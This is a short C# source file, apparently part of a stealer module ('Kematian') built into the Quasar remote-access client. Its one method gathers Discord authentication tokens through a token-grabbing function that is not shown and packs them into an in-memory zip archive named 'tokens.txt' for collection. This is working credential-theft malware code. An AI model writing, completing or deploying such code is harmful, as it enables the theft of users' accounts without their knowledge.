using Quasar.Client.Kematian.Discord;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;



namespace Quasar.Client.Kematian
{
    public class Handler
    {
        // create a zip file in memory and return the bytes
        public static byte[] GetData()
        {
            byte[] data = null;
            using (var memoryStream = new MemoryStream())
            {
                // Create a ZipArchive in the memory stream
                using (var archive = new ZipArchive(memoryStream, ZipArchiveMode.Create, true))
                {
                    var methods = new KeyValuePair<Func<string[]>, string>[]
                    {
                            new KeyValuePair<Func<string[]>, string>(GetTokens.Tokens, "tokens.txt"),
                    };

                    // Example of how you might use the methods array
                    foreach (var methodPair in methods)
                    {
                        var entries = methodPair.Key();
                        foreach (var entry in entries)
                        {
                            var zipEntry = archive.CreateEntry(methodPair.Value);
                            using (var entryStream = zipEntry.Open())
                            using (var streamWriter = new StreamWriter(entryStream))
                            {
                                streamWriter.Write(entry);
                            }
                        }
                    }
                }
                data = memoryStream.ToArray();
            }
            return data;
        }
    }
}
